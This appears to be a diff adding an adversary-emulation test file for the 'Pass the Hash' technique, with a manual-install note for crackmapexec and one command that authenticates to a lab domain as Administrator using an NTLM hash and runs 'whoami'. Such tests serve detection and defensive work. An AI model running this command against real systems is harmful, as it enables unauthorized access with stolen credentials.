@@ -1,0 +1,12 @@
+#TechniqueName: Use Alternate Authentication Material: Pass the Hash
+#AtomicTestName: crackmapexec Pass the Hash
+#Description: command execute with crackmapexec&
+#Language: cmd
+
+#get_prereq_commands
+Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: C:\CrackMapExecWin\crackmapexec.exe
+
+
+#commands
+crackmapexec atomic.local -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami
+
